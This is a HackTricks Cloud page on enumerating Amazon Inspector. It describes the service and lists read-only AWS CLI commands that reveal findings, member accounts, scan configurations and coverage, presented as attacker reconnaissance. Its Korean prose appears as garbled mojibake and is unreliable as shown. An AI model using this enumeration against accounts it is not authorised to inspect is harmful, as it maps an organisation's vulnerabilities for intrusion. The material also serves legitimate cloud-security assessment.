# AWS - Inspector Enum

<details>

<summary><strong>htARTE (HackTricks AWS Red Team ì „ë¬¸ê°€)ë¡œë¶€í„° AWS í•´í‚¹ì„ ì œë¡œë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ìš°ì„¸ìš”!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

- **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¶ë‹¤ë©´** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
- [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
- ğŸ’¬ **Discord ê·¸ë£¹**ì— ê°€ì…í•˜ê±°ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.
- **í•´í‚¹ ìš”ë ¹ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>

## Inspector

Amazon InspectorëŠ” AWS í™˜ê²½ì˜ ë³´ì•ˆì„ ê°•í™”í•˜ê¸° ìœ„í•´ ì„¤ê³„ëœ ê³ ê¸‰ ìë™ ì·¨ì•½ì  ê´€ë¦¬ ì„œë¹„ìŠ¤ì…ë‹ˆë‹¤. ì´ ì„œë¹„ìŠ¤ëŠ” Amazon EC2 ì¸ìŠ¤í„´ìŠ¤, Amazon ECRì˜ ì»¨í…Œì´ë„ˆ ì´ë¯¸ì§€, Amazon ECS ë° AWS Lambda í•¨ìˆ˜ë¥¼ ì§€ì†ì ìœ¼ë¡œ ì·¨ì•½ì  ë° ì˜ë„í•˜ì§€ ì•Šì€ ë„¤íŠ¸ì›Œí¬ ë…¸ì¶œë¡œë¶€í„° ìŠ¤ìº”í•©ë‹ˆë‹¤. ê°•ë ¥í•œ ì·¨ì•½ì  ì¸í…”ë¦¬ì „ìŠ¤ ë°ì´í„°ë² ì´ìŠ¤ë¥¼ í™œìš©í•˜ì—¬ Amazon InspectorëŠ” ì‹¬ê°ë„ ìˆ˜ì¤€ ë° ê¶Œê³  ì‚¬í•­ì„ í¬í•¨í•œ ìì„¸í•œ ê²°ê³¼ë¥¼ ì œê³µí•˜ì—¬ ì¡°ì§ì´ ë³´ì•ˆ ìœ„í—˜ì„ ì‚¬ì „ì— ì‹ë³„í•˜ê³  í•´ê²°í•  ìˆ˜ ìˆë„ë¡ ì§€ì›í•©ë‹ˆë‹¤. ì´ ì¢…í•©ì ì¸ ì ‘ê·¼ ë°©ì‹ì€ AWS ì„œë¹„ìŠ¤ ì „ë°˜ì— ê±¸ì³ ê°•í™”ëœ ë³´ì•ˆ ìì„¸ë¥¼ ë³´ì¥í•˜ë©° ê·œì • ì¤€ìˆ˜ ë° ë¦¬ìŠ¤í¬ ê´€ë¦¬ì— ë„ì›€ì´ ë©ë‹ˆë‹¤.

## ì£¼ìš” ìš”ì†Œ

### ê²°ê³¼

Amazon Inspectorì˜ ê²°ê³¼ëŠ” EC2 ì¸ìŠ¤í„´ìŠ¤, ECR ë¦¬í¬ì§€í† ë¦¬ ë˜ëŠ” Lambda í•¨ìˆ˜ë¥¼ ìŠ¤ìº”í•˜ëŠ” ë™ì•ˆ ë°œê²¬ëœ ì·¨ì•½ì  ë° ë…¸ì¶œì— ëŒ€í•œ ìƒì„¸ ë³´ê³ ì„œì…ë‹ˆë‹¤. ìƒíƒœì— ë”°ë¼ ê²°ê³¼ëŠ” ë‹¤ìŒê³¼ ê°™ì´ ë¶„ë¥˜ë©ë‹ˆë‹¤:

- **í™œì„±**: ê²°ê³¼ê°€ í•´ê²°ë˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤.
- **ë‹«í˜**: ê²°ê³¼ê°€ í•´ê²°ë˜ì—ˆìŠµë‹ˆë‹¤.
- **ì–µì œë¨**: í•˜ë‚˜ ì´ìƒì˜ **ì–µì œ ê·œì¹™**ìœ¼ë¡œ ì¸í•´ ê²°ê³¼ê°€ ì´ ìƒíƒœë¡œ í‘œì‹œë˜ì—ˆìŠµë‹ˆë‹¤.

ê²°ê³¼ëŠ” ë‹¤ìŒ ì„¸ ê°€ì§€ ìœ í˜•ìœ¼ë¡œë„ ë¶„ë¥˜ë©ë‹ˆë‹¤:

- **íŒ¨í‚¤ì§€**: ì´ëŸ¬í•œ ê²°ê³¼ëŠ” ë¦¬ì†ŒìŠ¤ì— ì„¤ì¹˜ëœ ì†Œí”„íŠ¸ì›¨ì–´ íŒ¨í‚¤ì§€ì˜ ì·¨ì•½ì ê³¼ ê´€ë ¨ì´ ìˆìŠµë‹ˆë‹¤. ì˜ˆì‹œë¡œëŠ” ì˜¤ë˜ëœ ë¼ì´ë¸ŒëŸ¬ë¦¬ë‚˜ ì•Œë ¤ì§„ ë³´ì•ˆ ë¬¸ì œê°€ ìˆëŠ” ì¢…ì†ì„±ì´ í¬í•¨ë©ë‹ˆë‹¤.
- **ì½”ë“œ**: ì´ ë²”ì£¼ì—ëŠ” AWS ë¦¬ì†ŒìŠ¤ì—ì„œ ì‹¤í–‰ ì¤‘ì¸ ì• í”Œë¦¬ì¼€ì´ì…˜ ì½”ë“œì—ì„œ ë°œê²¬ëœ ì·¨ì•½ì ì´ í¬í•¨ë©ë‹ˆë‹¤. ì¼ë°˜ì ì¸ ë¬¸ì œëŠ” ë³´ì•ˆ ìœ„ë°˜ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆëŠ” ì½”ë”© ì˜¤ë¥˜ë‚˜ ë³´ì•ˆì´ ì·¨ì•½í•œ ê´€í–‰ì…ë‹ˆë‹¤.
- **ë„¤íŠ¸ì›Œí¬**: ë„¤íŠ¸ì›Œí¬ ê²°ê³¼ëŠ” ê³µê²©ìê°€ ì•…ìš©í•  ìˆ˜ ìˆëŠ” ë„¤íŠ¸ì›Œí¬ êµ¬ì„±ì—ì„œ ì ì¬ì ì¸ ë…¸ì¶œì„ ì‹ë³„í•©ë‹ˆë‹¤. ì´ëŠ” ê°œë°©ëœ í¬íŠ¸, ë³´ì•ˆì´ ì·¨ì•½í•œ ë„¤íŠ¸ì›Œí¬ í”„ë¡œí† ì½œ ë° ì˜ëª» êµ¬ì„±ëœ ë³´ì•ˆ ê·¸ë£¹ì„ í¬í•¨í•©ë‹ˆë‹¤.

### í•„í„° ë° ì–µì œ ê·œì¹™

Amazon Inspectorì˜ í•„í„° ë° ì–µì œ ê·œì¹™ì€ ê²°ê³¼ë¥¼ ê´€ë¦¬í•˜ê³  ìš°ì„ ìˆœìœ„ë¥¼ ì§€ì •í•˜ëŠ” ë° ë„ì›€ì„ ì¤ë‹ˆë‹¤. í•„í„°ë¥¼ ì‚¬ìš©í•˜ë©´ ì‹¬ê°ë„ë‚˜ ë¦¬ì†ŒìŠ¤ ìœ í˜•ê³¼ ê°™ì€ íŠ¹ì • ê¸°ì¤€ì„ ê¸°ë°˜ìœ¼ë¡œ ê²°ê³¼ë¥¼ ì •ì œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì–µì œ ê·œì¹™ì„ ì‚¬ìš©í•˜ë©´ ë‚®ì€ ìœ„í—˜ìœ¼ë¡œ ê°„ì£¼ë˜ëŠ” íŠ¹ì • ê²°ê³¼ë¥¼ ì–µì œí•˜ì—¬ ë³´ì•ˆ ë³´ê³ ì„œë¥¼ ê³¼ë„í•˜ê²Œ ë§Œë“¤ì§€ ì•Šê³  ë³´ë‹¤ ì¤‘ìš”í•œ ë¬¸ì œì— ì§‘ì¤‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì†Œí”„íŠ¸ì›¨ì–´ ìì‚° ëª©ë¡ (SBOM)

Amazon Inspectorì˜ ì†Œí”„íŠ¸ì›¨ì–´ ìì‚° ëª©ë¡(SBOM)ì€ ë¼ì´ë¸ŒëŸ¬ë¦¬ ë° ì¢…ì†ì„±ì„ í¬í•¨í•œ ì†Œí”„íŠ¸ì›¨ì–´ íŒ¨í‚¤ì§€ ë‚´ ëª¨ë“  êµ¬ì„± ìš”ì†Œë¥¼ ìƒì„¸íˆ ë‚˜ì—´í•œ ë‚´ë³´ë‚¼ ìˆ˜ ìˆëŠ” ì¤‘ì²©ëœ ì¸ë²¤í† ë¦¬ ëª©ë¡ì…ë‹ˆë‹¤. SBOMì€ ì†Œí”„íŠ¸ì›¨ì–´ ê³µê¸‰ë§ì— ëŒ€í•œ íˆ¬ëª…ì„±ì„ ì œê³µí•˜ì—¬ ë” ë‚˜ì€ ì·¨ì•½ì  ê´€ë¦¬ì™€ ê·œì • ì¤€ìˆ˜ë¥¼ ê°€ëŠ¥í•˜ê²Œ í•©ë‹ˆë‹¤. ì˜¤í”ˆ ì†ŒìŠ¤ ë° ì œ3ì ì†Œí”„íŠ¸ì›¨ì–´ êµ¬ì„± ìš”ì†Œì™€ ê´€ë ¨ëœ ìœ„í—˜ì„ ì‹ë³„í•˜ê³  ì™„í™”í•˜ëŠ” ë° ì¤‘ìš”í•©ë‹ˆë‹¤.

## ì£¼ìš” ê¸°ëŠ¥

### ê²°ê³¼ ë‚´ë³´ë‚´ê¸°

Amazon InspectorëŠ” Amazon S3 ë²„í‚·, Amazon EventBridge ë° AWS Security Hubë¡œ ê²°ê³¼ë¥¼ ë‚´ë³´ë‚´ëŠ” ê¸°ëŠ¥ì„ ì œê³µí•˜ì—¬ íŠ¹ì • ë‚ ì§œì™€ ì‹œê°„ì— ì‹ë³„ëœ ì·¨ì•½ì  ë° ë…¸ì¶œì— ëŒ€í•œ ìì„¸í•œ ë³´ê³ ì„œë¥¼ ìƒì„±í•˜ì—¬ ì¶”ê°€ ë¶„ì„ì´ë‚˜ ê³µìœ ë¥¼ ê°€ëŠ¥í•˜ê²Œ í•©ë‹ˆë‹¤. ì´ ê¸°ëŠ¥ì€ CSV ë° JSONê³¼ ê°™ì€ ë‹¤ì–‘í•œ ì¶œë ¥ í˜•ì‹ì„ ì§€ì›í•˜ì—¬ ë‹¤ë¥¸ ë„êµ¬ ë° ì‹œìŠ¤í…œê³¼ ì‰½ê²Œ í†µí•©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë‚´ë³´ë‚´ê¸° ê¸°ëŠ¥ì„ ì‚¬ìš©í•˜ë©´ ë³´ê³ ì„œì— í¬í•¨í•  ë°ì´í„°ë¥¼ ì‚¬ìš©ì ì •ì˜í•  ìˆ˜ ìˆì–´ íŠ¹ì • ê¸°ì¤€(ì‹¬ê°ë„, ë¦¬ì†ŒìŠ¤ ìœ í˜• ë˜ëŠ” ë‚ ì§œ ë²”ìœ„)ì— ë”°ë¼ ê²°ê³¼ë¥¼ í•„í„°ë§í•˜ê³  í˜„ì¬ AWS ì§€ì—­ì˜ ëª¨ë“  í™œì„± ìƒíƒœ ê²°ê³¼ë¥¼ ê¸°ë³¸ì ìœ¼ë¡œ í¬í•¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ê²°ê³¼ë¥¼ ë‚´ë³´ë‚¼ ë•ŒëŠ” ë°ì´í„°ë¥¼ ë‚´ë³´ë‚´ëŠ” ë™ì•ˆ ì•”í˜¸í™”í•˜ê¸° ìœ„í•´ Key Management Service (KMS) í‚¤ê°€ í•„ìš”í•©ë‹ˆë‹¤. KMS í‚¤ë¥¼ ì‚¬ìš©í•˜ë©´ ë‚´ë³´ë‚¸ ê²°ê³¼ê°€ ë¬´ë‹¨ ì•¡ì„¸ìŠ¤ë¡œë¶€í„° ë³´í˜¸ë˜ì–´ ë¯¼ê°í•œ ì·¨ì•½ì  ì •ë³´ì— ëŒ€í•œ ì¶”ê°€ ë³´ì•ˆ ê³„ì¸µì„ ì œê³µí•©ë‹ˆë‹¤.

### Amazon EC2 ì¸ìŠ¤í„´ìŠ¤ ìŠ¤ìº”

Amazon InspectorëŠ” Amazon EC2 ì¸ìŠ¤í„´ìŠ¤ì— ëŒ€í•œ ê°•ë ¥í•œ ìŠ¤ìº” ê¸°ëŠ¥ì„ ì œê³µí•˜ì—¬ ì·¨ì•½ì ê³¼ ë³´ì•ˆ ë¬¸ì œë¥¼ ê°ì§€í•©ë‹ˆë‹¤. InspectorëŠ” EC2 ì¸ìŠ¤í„´ìŠ¤ì—ì„œ ì¶”ì¶œëœ ë©”íƒ€ë°ì´í„°ë¥¼ ë³´ì•ˆ ê³ ì§€ì—ì„œì˜ ê·œì¹™ê³¼ ë¹„êµí•˜ì—¬ íŒ¨í‚¤ì§€ ì·¨ì•½ì  ë° ë„¤íŠ¸ì›Œí¬ ì ‘ê·¼ì„± ë¬¸ì œë¥¼ ìƒì„±í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ìŠ¤ìº”ì€ ê³„ì •ì˜ **ìŠ¤ìº” ëª¨ë“œ** ì„¤ì • êµ¬ì„±ì— ë”°ë¼ **ì—ì´ì „íŠ¸ ê¸°ë°˜** ë˜ëŠ” **ì—ì´ì „íŠ¸ë¦¬ìŠ¤** ë°©ë²•ì„ í†µí•´ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- **ì—ì´ì „íŠ¸ ê¸°ë°˜**: AWS Systems Manager (SSM) ì—ì´ì „íŠ¸ë¥¼ ì‚¬ìš©í•˜ì—¬ ì‹¬ì¸µ ìŠ¤ìº”ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤. ì´ ë°©ë²•ì„ ì‚¬ìš©í•˜ë©´ ì¸ìŠ¤í„´ìŠ¤ì—ì„œ ì§ì ‘ ë°ì´í„° ìˆ˜ì§‘ ë° ë¶„ì„ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.
- **ì—ì´ì „íŠ¸ë¦¬ìŠ¤**: ì¸ìŠ¤í„´ìŠ¤ì— ì—ì´ì „íŠ¸ë¥¼ ì„¤ì¹˜í•  í•„ìš”ê°€ ì—†ëŠ” ê°€ë²¼ìš´ ëŒ€ì•ˆì„ ì œê³µí•˜ë©° EC2 ì¸ìŠ¤í„´ìŠ¤ì˜ ëª¨ë“  ë³¼ë¥¨ì— ëŒ€í•œ EBS ìŠ¤ëƒ…ìƒ·ì„ ìƒì„±í•˜ì—¬ ì·¨ì•½ì ì„ ì°¾ì€ í›„ ì‚­ì œí•©ë‹ˆë‹¤. ìŠ¤ìº”ì€ ê¸°ì¡´ì˜ AWS ì¸í”„ë¼ë¥¼ í™œìš©í•©ë‹ˆë‹¤.

ìŠ¤ìº” ëª¨ë“œëŠ” EC2 ìŠ¤ìº”ì„ ìˆ˜í–‰í•˜ëŠ” ë° ì‚¬ìš©í•  ë°©ë²•ì„ ê²°ì •í•©ë‹ˆë‹¤:

- **ì—ì´ì „íŠ¸ ê¸°ë°˜**: EC2 ì¸ìŠ¤í„´ìŠ¤ì— SSM ì—ì´ì „íŠ¸ë¥¼ ì„¤ì¹˜í•˜ì—¬ ì‹¬ì¸µ ê²€ì‚¬ë¥¼ ìˆ˜í–‰í•©ë‹ˆë‹¤.
- **í•˜ì´ë¸Œë¦¬ë“œ ìŠ¤ìº”**: ì—ì´ì „íŠ¸ ê¸°ë°˜ ë° ì—ì´ì „íŠ¸ë¦¬ìŠ¤ ë°©ë²•ì„ ê²°í•©í•˜ì—¬ ë²”ìœ„ë¥¼ ìµœëŒ€í™”í•˜ê³  ì„±ëŠ¥ ì˜í–¥ì„ ìµœì†Œí™”í•©ë‹ˆë‹¤. SSM ì—ì´ì „íŠ¸ê°€ ì„¤ì¹˜ëœ EC2 ì¸ìŠ¤í„´ìŠ¤ì—ì„œëŠ” Inspectorê°€ ì—ì´ì „íŠ¸ ê¸°ë°˜ ìŠ¤ìº”ì„ ìˆ˜í–‰í•˜ê³  SSM ì—ì´ì „íŠ¸ê°€ ì—†ëŠ” ì¸ìŠ¤í„´ìŠ¤ì—ì„œëŠ” ì—ì´ì „íŠ¸ë¦¬ìŠ¤ ìŠ¤ìº”ì„ ìˆ˜í–‰í•©ë‹ˆë‹¤.

ë˜ ë‹¤ë¥¸ ì¤‘ìš”í•œ ê¸°ëŠ¥ì€ EC2 Linux ì¸ìŠ¤í„´ìŠ¤ì˜ **ì‹¬ì¸µ ê²€ì‚¬**ì…ë‹ˆë‹¤. ì´ ê¸°ëŠ¥ì€ EC2 Linux ì¸ìŠ¤í„´ìŠ¤ì˜ ì†Œí”„íŠ¸ì›¨ì–´ ë° êµ¬ì„±ì„ ì² ì €íˆ ë¶„ì„í•˜ì—¬ ìš´ì˜ ì²´ì œ ì·¨ì•½ì , ì‘ìš© í”„ë¡œê·¸ë¨ ì·¨ì•½ì  ë° ì˜ëª»ëœ êµ¬ì„±ì„ í¬í•¨í•œ ìì„¸í•œ ì·¨ì•½ì  í‰ê°€ë¥¼ ì œê³µí•©ë‹ˆë‹¤. ì´ëŠ” **ì‚¬ìš©ì ì •ì˜ ê²½ë¡œ** ë° í•´ë‹¹ í•˜ìœ„ ë””ë ‰í† ë¦¬ì˜ ê²€ì‚¬ë¥¼ í†µí•´ ë‹¬ì„±ë©ë‹ˆë‹¤. Amazon InspectorëŠ” ê¸°ë³¸ì ìœ¼ë¡œ ë‹¤ìŒì„ ìŠ¤ìº”í•˜ì§€ë§Œ ê° íšŒì› ê³„ì •ì€ 5ê°œì˜ ì‚¬ìš©ì ì •ì˜ ê²½ë¡œë¥¼ ì •ì˜í•˜ê³  ê° ìœ„ì„ëœ ê´€ë¦¬ìëŠ” ìµœëŒ€ 10ê°œì˜ ê²½ë¡œë¥¼ ì •ì˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

- `/usr/lib`
- `/usr/lib64`
- `/usr/local/lib`
- `/usr/local/lib64`

### Amazon ECR ì»¨í…Œì´ë„ˆ ì´ë¯¸ì§€ ìŠ¤ìº”

Amazon InspectorëŠ” Amazon Elastic Container Registry (ECR) ì»¨í…Œì´ë„ˆ ì´ë¯¸ì§€ì— ëŒ€í•œ ê°•ë ¥í•œ ìŠ¤ìº” ê¸°ëŠ¥ì„ ì œê³µí•˜ì—¬ íŒ¨í‚¤ì§€ ì·¨ì•½ì ì´ íš¨ìœ¨ì ìœ¼ë¡œ ê°ì§€ë˜ê³  ê´€ë¦¬ë©ë‹ˆë‹¤.

- **ê¸°ë³¸ ìŠ¤ìº”**: ì´ê²ƒì€ ì˜¤í”ˆ ì†ŒìŠ¤ Clair í”„ë¡œì íŠ¸ì˜ í‘œì¤€ ê·œì¹™ì„ ì‚¬ìš©í•˜ì—¬ ì»¨í…Œì´ë„ˆ ì´ë¯¸ì§€ì—ì„œ ì•Œë ¤ì§„ OS íŒ¨í‚¤ì§€ ì·¨ì•½ì ì„ ì‹ë³„í•˜ëŠ” ë¹ ë¥´ê³  ê°€ë²¼ìš´ ìŠ¤ìº”ì…ë‹ˆë‹¤. ì´ ìŠ¤ìº” êµ¬ì„±ì—ì„œëŠ” ë¦¬í¬ì§€í† ë¦¬ê°€ í‘¸ì‹œë  ë•Œ ë˜ëŠ” ìˆ˜ë™ ìŠ¤ìº”ì„ ìˆ˜í–‰í•  ë•Œ ë¦¬í¬ì§€í† ë¦¬ê°€ ìŠ¤ìº”ë©ë‹ˆë‹¤.
- **í–¥ìƒëœ ìŠ¤ìº”**: ì´ ì˜µì…˜ì€ í‘¸ì‹œ ìŠ¤ìº”ì— ì§€ì†ì ì¸ ìŠ¤ìº” ê¸°ëŠ¥ì„ ì¶”ê°€í•©ë‹ˆë‹¤. í–¥ìƒëœ ìŠ¤ìº”ì€ ê° ì»¨í…Œì´ë„ˆ ì´ë¯¸ì§€ì˜ ë ˆì´ì–´ë¥¼ ë” ê¹Šì´ íŒŒê³ ë“¤ì–´ OS íŒ¨í‚¤ì§€ ë° í”„ë¡œê·¸ë˜ë° ì–¸ì–´ íŒ¨í‚¤ì§€ì˜ ì·¨ì•½ì ì„ ë” ì •í™•í•˜ê²Œ ì‹ë³„í•©ë‹ˆë‹¤. ê¸°ë³¸ ì´ë¯¸ì§€ì™€ ì¶”ê°€ ë ˆì´ì–´ë¥¼ ëª¨ë‘ ë¶„ì„í•˜ì—¬ ì ì¬ì ì¸ ë³´ì•ˆ ë¬¸ì œì— ëŒ€í•œ í¬ê´„ì ì¸ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤.

### Amazon Lambda í•¨ìˆ˜ ìŠ¤ìº”

Amazon InspectorëŠ” AWS Lambda í•¨ìˆ˜ ë° í•´ë‹¹ ë ˆì´ì–´ì— ëŒ€í•œ í¬ê´„ì ì¸ ìŠ¤ìº” ê¸°ëŠ¥ì„ ì œê³µí•˜ì—¬ ì„œë²„ë¦¬ìŠ¤ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ë³´ì•ˆê³¼ ë¬´ê²°ì„±ì„ ë³´ì¥í•©ë‹ˆë‹¤. InspectorëŠ” Lambda í•¨ìˆ˜ì— ëŒ€í•´ ë‘ ê°€ì§€ ìœ í˜•ì˜ ìŠ¤ìº”ì„ ì œê³µí•©ë‹ˆë‹¤:

- **Lambda í‘œì¤€ ìŠ¤ìº”**: ì´ ê¸°ë³¸ ê¸°ëŠ¥ì€ Lambda í•¨ìˆ˜ ë° ë ˆì´ì–´ì— ì¶”ê°€ëœ ì• í”Œë¦¬ì¼€ì´ì…˜ íŒ¨í‚¤ì§€ ì¢…ì†ì„±ì˜ ì†Œí”„íŠ¸ì›¨ì–´ ì·¨ì•½ì ì„ ì‹ë³„í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, í•¨ìˆ˜ê°€ ì•Œë ¤ì§„ ì·¨ì•½ì ì´ ìˆëŠ” python-jwtì™€ ê°™ì€ ë¼ì´ë¸ŒëŸ¬ë¦¬ ë²„ì „ì„ ì‚¬ìš©í•˜ëŠ” ê²½ìš° ê²°ê³¼ë¥¼ ìƒì„±í•©ë‹ˆë‹¤.
- **Lambda ì½”ë“œ ìŠ¤ìº”**: ë³´ì•ˆ ë¬¸ì œë¥¼ ìœ„í•´ ì‚¬ìš©ì ì§€ì • ì• í”Œë¦¬ì¼€ì´ì…˜ ì½”ë“œë¥¼ ë¶„ì„í•˜ì—¬ ì·¨ì•½ì ì„ ê°ì§€í•©ë‹ˆë‹¤. ì‚½ì… ì˜¤ë¥˜, ë°ì´í„° ëˆ„ì¶œ, ì·¨ì•½í•œ ì•”í˜¸í™” ë° ì•”í˜¸í™” ëˆ„ë½ê³¼ ê°™ì€ ì·¨ì•½ì ì„ ì‹ë³„í•©ë‹ˆë‹¤. ê°ì§€ëœ ì·¨ì•½ì ì„ ê°•ì¡°í•˜ëŠ” ì½”ë“œ ì¡°ê°ì„ ìº¡ì²˜í•˜ë©° í•˜ë“œì½”ë”©ëœ ìê²© ì¦ëª…ê³¼ ê°™ì€ ë¬¸ì œë¥¼ í•´ê²°í•˜ê¸° ìœ„í•œ ìì„¸í•œ ê¶Œê³  ì‚¬í•­ê³¼ ì½”ë“œ ì¡°ê°ì´ í¬í•¨ë©ë‹ˆë‹¤.
### **ì¸í„°ë„· ë³´ì•ˆ ì„¼í„° (CIS) ìŠ¤ìº”**

Amazon Inspectorì—ëŠ” ì¸í„°ë„· ë³´ì•ˆ ì„¼í„° (CIS)ì˜ ëª¨ë²” ì‚¬ë¡€ ê¶Œì¥ ì‚¬í•­ì— ë”°ë¼ Amazon EC2 ì¸ìŠ¤í„´ìŠ¤ ìš´ì˜ ì²´ì œë¥¼ í‰ê°€í•˜ëŠ” CIS ìŠ¤ìº”ì´ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ìŠ¤ìº”ì€ êµ¬ì„±ì´ ì‚°ì—… í‘œì¤€ ë³´ì•ˆ ê¸°ì¤€ì„ ì¤€ìˆ˜í•˜ëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.

- **êµ¬ì„±**: CIS ìŠ¤ìº”ì€ ì‹œìŠ¤í…œ êµ¬ì„±ì´ íŠ¹ì • CIS ë²¤ì¹˜ë§ˆí¬ ê¶Œì¥ ì‚¬í•­ì„ ì¶©ì¡±í•˜ëŠ”ì§€ë¥¼ í‰ê°€í•˜ë©°, ê° ì²´í¬ëŠ” CIS ì²´í¬ ID ë° ì œëª©ì— ì—°ê²°ë©ë‹ˆë‹¤.
- **ì‹¤í–‰**: ìŠ¤ìº”ì€ ì¸ìŠ¤í„´ìŠ¤ íƒœê·¸ ë° ì •ì˜ëœ ì¼ì •ì— ë”°ë¼ ìˆ˜í–‰ë˜ê±°ë‚˜ ì˜ˆì•½ë©ë‹ˆë‹¤.
- **ê²°ê³¼**: ìŠ¤ìº” í›„ ê²°ê³¼ëŠ” ê° ì¸ìŠ¤í„´ìŠ¤ì˜ ë³´ì•ˆ í¬ì§€ì…˜ì— ëŒ€í•œ í†µì°°ì„ ì œê³µí•˜ë©°, í†µê³¼í•œ ì²´í¬, ê±´ë„ˆë›´ ì²´í¬ ë˜ëŠ” ì‹¤íŒ¨í•œ ì²´í¬ë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤.

## ì—´ê±°
```bash
# Administrator and member accounts #

## Retrieve information about the AWS Inpsector delegated administrator for your organization (ReadOnlyAccess policy is enough for this)
aws inspector2 get-delegated-admin-account

## List the members who are associated with the AWS Inspector administrator account (ReadOnlyAccess policy is enough for this)
aws inspector2 list-members [--only-associated | --no-only-associated]
## Retrieve information about a member account (ReadOnlyAccess policy is enough for this)
aws inspector2 get-member --account-id <value>
## Retrieve the status of AWS accounts within your environment (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-account-status [--account-ids <value>]
## Retrieve the free trial status for the specified accounts (ReadOnlyAccess policy is enough for this)
aws inspector2 batch-get-free-trial-info --account-ids <value>
## Retrieve the EC2 Deep Inspection status for the member accounts (Requires to be the delegated administrator)
aws inspector2 batch-get-member-ec2-deep-inspection-status [--account-ids <value>]

## List an account's permissions associated with AWS Inspector
aws inspector2 list-account-permissions

# Findings #

## List a subset of information of the findings for your envionment (ReadOnlyAccess policy is enough for this)
aws inspector2 list-findings
## Retrieve vulnerability intelligence details for the specified findings
aws inspector2 batch-get-finding-details --finding-arns <value>
## List statistical and aggregated finding data (ReadOnlyAccess policy is enough for this)
aws inspector2 list-finding-aggregations --aggregation-type <FINDING_TYPE | PACKAGE | TITLE | REPOSITORY | AMI | AWS_EC2_INSTANCE | AWS_ECR_CONTAINER | IMAGE_LAYER\
| ACCOUNT AWS_LAMBDA_FUNCTION | LAMBDA_LAYER> [--account-ids <value>]
## Retrieve code snippet information about one or more specified code vulnerability findings
aws inspector2 batch-get-code-snippet --finding-arns <value>
## Retrieve the status for the specified findings report (ReadOnlyAccess policy is enough for this)
aws inspector2 get-findings-report-status --report-id <value>

# CIS #

## List CIS scan configurations (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scan-configurations
## List the completed CIS scans (ReadOnlyAccess policy is enough for this)
aws inspector2 list-cis-scans
## Retrieve a report from a completed CIS scan
aws inspector2 get-cis-scan-report --scan-arn <value> [--target-accounts <value>]
## Retrieve details about the specific CIS scan over the specified resource
aws inspector2 get-cis-scan-result-details --account-id <value> --scan-arn <value> --target-resource-id <value>
## List CIS scan results broken down by check
aws inspector2 list-cis-scan-results-aggregated-by-checks --scan-arn <value>
## List CIS scan results broken down by target resource
aws inspector2 list-cis-scan-results-aggregated-by-target-resource --scan-arn <value>

# Configuration #

## Describe AWS Inspector settings for AWS Organization (ReadOnlyAccess policy is enough for this)
aws inspector2 describe-organization-configuration
## Retrieve the configuration settings about EC2 scan and ECR re-scan
aws inspector2 get-configuration
## Retrieve EC2 Deep Inspection configuration associated with your account
aws inspector2 get-ec2-deep-inspection-configuration

# Miscellaneous #

## Retrieve the details of a Software Bill of Materials (SBOM) report
aws inspector2 get-sbom-export --report-id <value>

## Retrieve the coverage details for the specified vulnerabilities
aws inspector2 search-vulnerabilities --filter-criteria <vulnerabilityIds=id1,id2..>

## Retrieve the tags attached to the specified resource
aws inspector2 list-tags-for-resource --resource-arn <value>

## Retrieve the AWS KMS key used to encrypt the specified code snippets
aws inspector2 get-encryption-key --resource-type <AWS_EC2_INSTANCE | AWS_ECR_CONTAINER_IMAGE | AWS_ECR_REPOSITORY | AWS_LAMBDA_FUNCTION> --scan-type <NETWORK | PACKAGE | CODE>

## List the filters associated to your AWS account
aws inspector2 list-filters

## List the types of statistics AWS Inspector can generate (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage
## Retrieve statistical data and about the resources AWS Inspector monitors (ReadOnlyAccess policy is enough for this)
aws inspector2 list-coverage-statistics

## List the aggregated usage total over the last 30 days
aws inspector2 list-usage-totals [--account-ids <value>]

### INSPECTOR CLASSIC ###

## Assessments info, there is a "describe" action for each one to get more info
aws inspector list-assessment-runs
aws inspector list-assessment-targets
aws inspector list-assessment-templates
aws inspector list-event-subscriptions

## Get findings
aws inspector list-findings

## Get exclusions
